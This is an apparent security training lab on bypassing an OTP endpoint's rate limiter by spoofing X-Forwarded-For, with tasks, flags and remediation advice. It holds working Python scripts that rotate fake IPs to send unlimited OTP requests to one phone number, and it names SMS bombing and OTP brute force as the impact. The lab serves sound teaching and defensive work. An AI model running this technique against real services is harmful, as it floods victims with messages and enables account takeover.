# Lab: Rate-Limit Bypass via Header Rotation

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Bypass a real rate limiter using X-Forwarded-For rotation |
| **Difficulty** | ⭐⭐ Medium                                           |
| **Time**       | 35 minutes                                            |
| **Category**   | Resource Consumption / Bypass Technique                 |
| **OWASP**      | API4:2023 - Unrestricted Resource Consumption            |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- Python 3 with the `requests` library
- Completion of Lab 05 (Lack of Rate Limiting) is recommended for contrast — that lab has NO limiter at all; this one has a real, but bypassable, one

---

## Background

`POST /api/v1/otp/request` enforces a real rate limit: 3 requests per 60 seconds. Unlike the endpoints in Lab 05, this one genuinely tries to protect itself. The limiter keys on `X-Forwarded-For` first, falling back to the raw socket address — a common pattern for apps meant to run behind a reverse proxy. The bug: this app isn't actually behind a trusted proxy in this lab, so nothing strips or validates that header, and any client can simply set a new value on every request.

---

## Tasks

### Task 1: Confirm the Rate Limit Works Normally

**Steps:**
1. Send 4 requests in a row with no `X-Forwarded-For` header and observe the 4th get blocked

**Python example:**
```python
import requests

BASE = "http://localhost:5001/api/v1"
token = "..."  # login as alice first
headers = {"Authorization": f"Bearer {token}"}

for i in range(4):
    r = requests.post(f"{BASE}/otp/request", headers=headers,
                       json={"phone_number": "+959123456789"})
    print(f"Request {i+1}: {r.status_code} - {r.json()}")
```

**🚩 FLAG 1: Which request number gets HTTP 429, and what does `retry_after_seconds` say?**

<details>
<summary>💡 Hint 1</summary>
The 4th request in a 60-second window should be blocked, since the limit is 3.
</details>

---

### Task 2: Bypass It With a Single Rotated Header

**Steps:**
1. Immediately after being blocked, retry with a spoofed `X-Forwarded-For` header

**Python example:**
```python
r = requests.post(f"{BASE}/otp/request",
                   headers={**headers, "X-Forwarded-For": "1.2.3.4"},
                   json={"phone_number": "+959123456789"})
print(r.status_code, r.json())
```

**🚩 FLAG 2: Confirm the spoofed-header request succeeds even though you were just rate-limited**

<details>
<summary>💡 Hint 1</summary>
If this returns 200 with a fresh `otp_code`, the rate limiter has been bypassed with nothing more than one extra header.
</details>

---

### Task 3: Full Bypass Script — Unlimited OTP Requests

**Steps:**
1. Write a loop that rotates `X-Forwarded-For` on every single request and sends far more than 3 requests in under 60 seconds, all targeting the same `phone_number`

**Python example:**
```python
for i in range(15):
    fake_ip = f"10.0.0.{i}"
    r = requests.post(f"{BASE}/otp/request",
                       headers={**headers, "X-Forwarded-For": fake_ip},
                       json={"phone_number": "+959123456789"})
    print(f"[{i}] XFF={fake_ip} -> {r.status_code}")
```

**🚩 FLAG 3: How many of the 15 requests succeeded (status 200)?**

<details>
<summary>💡 Hint 1</summary>
If the bypass works, all 15 should succeed — demonstrating the "3 per 60s" limit provides effectively zero protection against a caller who rotates the header.
</details>

---

### Task 4: Real-World Impact — SMS Bombing / OTP Brute Force

**Steps:**
1. Consider: with unlimited OTP requests against the *same* phone number, what two distinct attacks become possible?

**🚩 FLAG 4: Name both attack scenarios this bypass enables**

<details>
<summary>💡 Hint 1</summary>
One is annoying (flooding a victim's phone with SMS messages / cost via SMS billing), the other is a security bypass (brute-forcing a 6-digit OTP code — 1,000,000 possibilities becomes feasible without a real per-account rate limit).
</details>

---

## Flags to Find

| Flag   | Description                                              | Hint                                       |
|--------|--------------------------------------------------------------|-----------------------------------------------|
| FLAG 1 | Which request gets 429, and the retry_after value              | Send 4 plain requests                          |
| FLAG 2 | Confirm one spoofed header bypasses the block                  | Add `X-Forwarded-For` after being blocked      |
| FLAG 3 | Count of successful requests out of 15 rotated-header calls    | Loop with a different XFF value each time      |
| FLAG 4 | Two real-world attacks this bypass enables                     | Think about cost and brute-force implications  |

---

## Remediation

### 1. Only Trust X-Forwarded-For From a Known Proxy Hop Count
```python
from werkzeug.middleware.proxy_fix import ProxyFix
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1)
```

### 2. Key on More Than Just IP
```python
key = f"{authenticated_user_id}:{ip_address}"
```

### 3. Use a Sliding Window Instead of Fixed Window
- A sliding window log (e.g. Redis sorted set of timestamps) avoids the boundary-burst issue entirely.

### 4. Add Account-Level (Not Just IP-Level) Limits
- Rate-limit by `phone_number` too, independent of who's calling — this closes the bypass even if the IP-based limit is defeated.

---

## References

- [OWASP API Security Top 10 - API4:2023](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)
- [OWASP: IP Address Spoofing](https://owasp.org/www-community/attacks/IP_Address_Spoofing)
